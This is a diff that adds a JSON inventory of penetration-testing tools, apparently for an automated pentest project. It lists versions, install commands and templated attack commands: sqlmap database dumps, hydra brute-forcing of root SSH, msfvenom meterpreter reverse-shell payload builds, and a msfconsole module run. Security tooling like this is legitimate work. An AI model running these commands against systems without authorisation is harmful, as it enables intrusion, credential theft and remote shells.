@@ -1,0 +1,567 @@
+[
+  {
+    "name": "nmap",
+    "path": "/usr/bin/nmap",
+    "version": "Nmap version 7.99 ( https://nmap.org )",
+    "category": "unknown",
+    "purpose": "Auto-installed tool",
+    "install_command": "sudo apt install -y nmap",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-07T02:48:43.764679+00:00"
+  },
+  {
+    "name": "masscan",
+    "path": "/usr/bin/masscan",
+    "version": "Masscan version 1.3.2 ( https://github.com/robertdavidgraham/masscan )",
+    "category": "scanning",
+    "purpose": "Ultra-fast port scanner",
+    "install_command": "sudo apt install -y masscan",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "rustscan",
+    "path": null,
+    "version": null,
+    "category": "scanning",
+    "purpose": "Fast port pre-scanner feeding into nmap",
+    "install_command": "sudo apt install -y rustscan",
+    "common_commands": [],
+    "found": false,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "arp-scan",
+    "path": "/usr/sbin/arp-scan",
+    "version": "arp-scan 1.10.0",
+    "category": "scanning",
+    "purpose": "ARP host discovery on local network",
+    "install_command": "sudo apt install -y arp-scan",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "nikto",
+    "path": "/usr/bin/nikto",
+    "version": "/usr/bin/nikto: 5: exec: /var/lib/nikto/nikto.pl: not found",
+    "category": "web",
+    "purpose": "Web server vulnerability scanner",
+    "install_command": "sudo apt install -y nikto",
+    "common_commands": [
+      "nikto -h {target}",
+      "nikto -h {target} -p 443 -ssl"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "gobuster",
+    "path": "/usr/bin/gobuster",
+    "version": "No help topic for 'version'",
+    "category": "web",
+    "purpose": "Directory and DNS brute forcer",
+    "install_command": "sudo apt install -y gobuster",
+    "common_commands": [
+      "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt",
+      "gobuster dns -d {target} -w /usr/share/wordlists/amass/subdomains-top1mil-5000.txt"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "dirb",
+    "path": "/usr/bin/dirb",
+    "version": "DIRB v2.22",
+    "category": "web",
+    "purpose": "Web content directory scanner",
+    "install_command": "sudo apt install -y dirb",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "ffuf",
+    "path": "/usr/bin/ffuf",
+    "version": "ffuf version: 2.1.0-dev",
+    "category": "web",
+    "purpose": "Fast web fuzzer",
+    "install_command": "sudo apt install -y ffuf",
+    "common_commands": [
+      "ffuf -u http://{target}/FUZZ -w /usr/share/wordlists/dirb/common.txt"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "wfuzz",
+    "path": "/usr/bin/wfuzz",
+    "version": "3.1.0",
+    "category": "web",
+    "purpose": "Web application fuzzer",
+    "install_command": "sudo apt install -y wfuzz",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "whatweb",
+    "path": "/usr/bin/whatweb",
+    "version": "WhatWeb version 0.6.3 ( https://morningstarsecurity.com/research/whatweb/ )",
+    "category": "web",
+    "purpose": "Web technology fingerprinter",
+    "install_command": "sudo apt install -y whatweb",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "wafw00f",
+    "path": "/usr/bin/wafw00f",
+    "version": "\u001b[1;97m______",
+    "category": "web",
+    "purpose": "WAF detection tool",
+    "install_command": "pip install wafw00f",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "sqlmap",
+    "path": "/usr/bin/sqlmap",
+    "version": "1.10.2#stable",
+    "category": "exploitation",
+    "purpose": "Automated SQL injection and takeover",
+    "install_command": "sudo apt install -y sqlmap",
+    "common_commands": [
+      "sqlmap -u 'http://{target}/page?id=1' --batch --dbs",
+      "sqlmap -u 'http://{target}/page?id=1' --batch --dump --level 3"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "hydra",
+    "path": "/usr/bin/hydra",
+    "version": "-I        ignore an existing restore file (don't wait 10 seconds)",
+    "category": "exploitation",
+    "purpose": "Network login brute forcer",
+    "install_command": "sudo apt install -y hydra",
+    "common_commands": [
+      "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form",
+      "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target}"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "john",
+    "path": "/usr/sbin/john",
+    "version": "Unknown option: \"--version\"",
+    "category": "exploitation",
+    "purpose": "Password hash cracker",
+    "install_command": "sudo apt install -y john",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "hashcat",
+    "path": "/usr/bin/hashcat",
+    "version": "v7.1.2",
+    "category": "exploitation",
+    "purpose": "GPU-accelerated password cracker",
+    "install_command": "sudo apt install -y hashcat",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "msfconsole",
+    "path": "/usr/bin/msfconsole",
+    "version": "Framework Version: 6.4.116-dev",
+    "category": "exploitation",
+    "purpose": "Metasploit Framework console",
+    "install_command": "sudo apt install -y metasploit-framework",
+    "common_commands": [
+      "msfconsole -q -x 'use {module}; set RHOSTS {target}; run; exit'"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "msfvenom",
+    "path": "/usr/bin/msfvenom",
+    "version": "msfvenom: version unknown",
+    "category": "exploitation",
+    "purpose": "Metasploit payload generator",
+    "install_command": "sudo apt install -y metasploit-framework",
+    "common_commands": [
+      "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o payload.elf",
+      "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "searchsploit",
+    "path": "/usr/bin/searchsploit",
+    "version": "Usage: searchsploit [options] term1 [term2] ... [termN]",
+    "category": "exploitation",
+    "purpose": "Offline Exploit-DB search tool",
+    "install_command": "sudo apt install -y exploitdb",
+    "common_commands": [
+      "searchsploit {service} {version}",
+      "searchsploit -x {edb_id}"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "nuclei",
+    "path": null,
+    "version": null,
+    "category": "vulnerability",
+    "purpose": "Template-based vulnerability scanner",
+    "install_command": "sudo apt install -y nuclei",
+    "common_commands": [],
+    "found": false,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "enum4linux",
+    "path": "/usr/bin/enum4linux",
+    "version": "./enum4linux.pl version [unknown] calling Getopt::Std::getopts (version 1.14 [paranoid]),",
+    "category": "enumeration",
+    "purpose": "SMB/NetBIOS enumeration",
+    "install_command": "sudo apt install -y enum4linux",
+    "common_commands": [
+      "enum4linux -a {target}"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "smbclient",
+    "path": "/usr/bin/smbclient",
+    "version": "Version 4.23.6-Debian-4.23.6+dfsg-1+b1",
+    "category": "enumeration",
+    "purpose": "SMB client for share enumeration",
+    "install_command": "sudo apt install -y smbclient",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "rpcclient",
+    "path": "/usr/bin/rpcclient",
+    "version": "Version 4.23.6-Debian-4.23.6+dfsg-1+b1",
+    "category": "enumeration",
+    "purpose": "MS-RPC client for enumeration",
+    "install_command": "sudo apt install -y rpcclient",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "subfinder",
+    "path": null,
+    "version": null,
+    "category": "recon",
+    "purpose": "Subdomain discovery",
+    "install_command": "sudo apt install -y subfinder",
+    "common_commands": [],
+    "found": false,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "amass",
+    "path": "/usr/bin/amass",
+    "version": null,
+    "category": "recon",
+    "purpose": "In-depth attack surface mapping",
+    "install_command": "sudo apt install -y amass",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "theharvester",
+    "path": "/usr/bin/theharvester",
+    "version": "\u250f\u2501(\u001b[1;31mMessage from Kali developers\u001b[00m)",
+    "category": "recon",
+    "purpose": "OSINT email/domain/host harvester",
+    "install_command": "sudo apt install -y theharvester",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "aircrack-ng",
+    "path": "/usr/bin/aircrack-ng",
+    "version": "Aircrack-ng 1.7  - (C) 2006-2022 Thomas d'Otreppe",
+    "category": "wireless",
+    "purpose": "Wireless network cracker suite",
+    "install_command": "sudo apt install -y aircrack-ng",
+    "common_commands": [
+      "aircrack-ng -w /usr/share/wordlists/rockyou.txt {capture_file}"
+    ],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "airmon-ng",
+    "path": "/usr/sbin/airmon-ng",
+    "version": "Run it as root",
+    "category": "wireless",
+    "purpose": "Wireless monitor mode manager",
+    "install_command": "sudo apt install -y aircrack-ng",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "airodump-ng",
+    "path": "/usr/sbin/airodump-ng",
+    "version": "\u001b[0m\"/usr/sbin/airodump-ng --help\" for help.",
+    "category": "wireless",
+    "purpose": "Wireless packet capture and analysis",
+    "install_command": "sudo apt install -y aircrack-ng",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "netcat",
+    "path": "/usr/bin/netcat",
+    "version": "/usr/bin/netcat: invalid option -- '-'\nnc -h for help",
+    "category": "utility",
+    "purpose": "TCP/UDP network utility (nc)",
+    "install_command": "sudo apt install -y netcat-openbsd",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "socat",
+    "path": "/usr/bin/socat",
+    "version": "2026/07/04 13:01:57 socat[7657] E unknown option \"--version\"; use option \"-h\" for help",
+    "category": "utility",
+    "purpose": "Multipurpose relay tool",
+    "install_command": "sudo apt install -y socat",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "curl",
+    "path": "/usr/bin/curl",
+    "version": "Release-Date: 2026-01-07, security patched: 8.18.0-2",
+    "category": "utility",
+    "purpose": "HTTP client and data transfer",
+    "install_command": "sudo apt install -y curl",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "wget",
+    "path": "/usr/bin/wget",
+    "version": "GNU Wget 1.25.0 built on linux-gnu.",
+    "category": "utility",
+    "purpose": "Non-interactive HTTP/FTP downloader",
+    "install_command": "sudo apt install -y wget",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "whois",
+    "path": "/usr/bin/whois",
+    "version": "Version 5.6.6.",
+    "category": "recon",
+    "purpose": "Domain registrar lookup",
+    "install_command": "sudo apt install -y whois",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "dig",
+    "path": "/usr/bin/dig",
+    "version": "Invalid option: --version\nUsage:  dig [@global-server] [domain] [q-type] [q-class] {q-opt}\n         ",
+    "category": "recon",
+    "purpose": "DNS query tool",
+    "install_command": "sudo apt install -y dnsutils",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "host",
+    "path": "/usr/bin/host",
+    "version": "-A is like -a but omits RRSIG, NSEC, NSEC3",
+    "category": "recon",
+    "purpose": "DNS lookup utility",
+    "install_command": "sudo apt install -y dnsutils",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "ping",
+    "path": "/usr/bin/ping",
+    "version": "-3                 RTT precision (do not round up the result time)",
+    "category": "utility",
+    "purpose": "ICMP host reachability check",
+    "install_command": "sudo apt install -y iputils-ping",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "traceroute",
+    "path": "/usr/sbin/traceroute",
+    "version": "Modern traceroute for Linux, version 2.1.6",
+    "category": "utility",
+    "purpose": "Network path tracer",
+    "install_command": "sudo apt install -y traceroute",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "binwalk",
+    "path": "/usr/bin/binwalk",
+    "version": "General Error: Cannot open file --version (CWD: /home/dictator/Desktop/pentronix) : [Errno 2] No suc",
+    "category": "analysis",
+    "purpose": "Firmware analysis and extraction",
+    "install_command": "sudo apt install -y binwalk",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "strings",
+    "path": "/usr/bin/strings",
+    "version": "GNU strings (GNU Binutils for Debian) 2.46",
+    "category": "analysis",
+    "purpose": "Extract printable strings from files",
+    "install_command": "sudo apt install -y binutils",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "file",
+    "path": "/usr/bin/file",
+    "version": "file-5.46",
+    "category": "analysis",
+    "purpose": "File type identification",
+    "install_command": "sudo apt install -y file",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "exiftool",
+    "path": "/usr/bin/exiftool",
+    "version": "Syntax:  exiftool [OPTIONS] FILE\n\nConsult the exiftool documentation for a full list of options.",
+    "category": "analysis",
+    "purpose": "Image/file metadata extraction",
+    "install_command": "sudo apt install -y libimage-exiftool-perl",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "wireshark",
+    "path": "/usr/bin/wireshark",
+    "version": "Wireshark 4.6.4.",
+    "category": "sniffing",
+    "purpose": "Network protocol analyser (GUI)",
+    "install_command": "sudo apt install -y wireshark",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "tcpdump",
+    "path": "/usr/bin/tcpdump",
+    "version": "tcpdump version 4.99.6",
+    "category": "sniffing",
+    "purpose": "Command-line packet analyser",
+    "install_command": "sudo apt install -y tcpdump",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "ettercap",
+    "path": "/usr/bin/ettercap",
+    "version": "\u001b[1mettercap 0.8.4\u001b[0m copyright 2001-2026 Ettercap Development Team",
+    "category": "sniffing",
+    "purpose": "Man-in-the-middle attack suite",
+    "install_command": "sudo apt install -y ettercap-common",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "bettercap",
+    "path": null,
+    "version": null,
+    "category": "sniffing",
+    "purpose": "Network attack and monitoring framework",
+    "install_command": "sudo apt install -y bettercap",
+    "common_commands": [],
+    "found": false,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "metasploit-framework",
+    "path": null,
+    "version": null,
+    "category": "exploitation",
+    "purpose": "Full Metasploit framework",
+    "install_command": "sudo apt install -y metasploit-framework",
+    "common_commands": [],
+    "found": false,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "beef-xss",
+    "path": "/usr/bin/beef-xss",
+    "version": "\u001b[01;31m[-]\u001b[00m This script must be \u001b[01;31mrun as root\u001b[00m",
+    "category": "exploitation",
+    "purpose": "Browser Exploitation Framework",
+    "install_command": "sudo apt install -y beef-xss",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "responder",
+    "path": "/usr/sbin/responder",
+    "version": "Responder 3.2.2.0",
+    "category": "exploitation",
+    "purpose": "LLMNR/NBT-NS/MDNS poisoner",
+    "install_command": "sudo apt install -y responder",
+    "common_commands": [],
+    "found": true,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  },
+  {
+    "name": "impacket-scripts",
+    "path": null,
+    "version": null,
+    "category": "exploitation",
+    "purpose": "Impacket Python network toolkit",
+    "install_command": "sudo apt install -y impacket-scripts",
+    "common_commands": [],
+    "found": false,
+    "last_scanned": "2026-07-04T07:31:47.306998+00:00"
+  }
+]
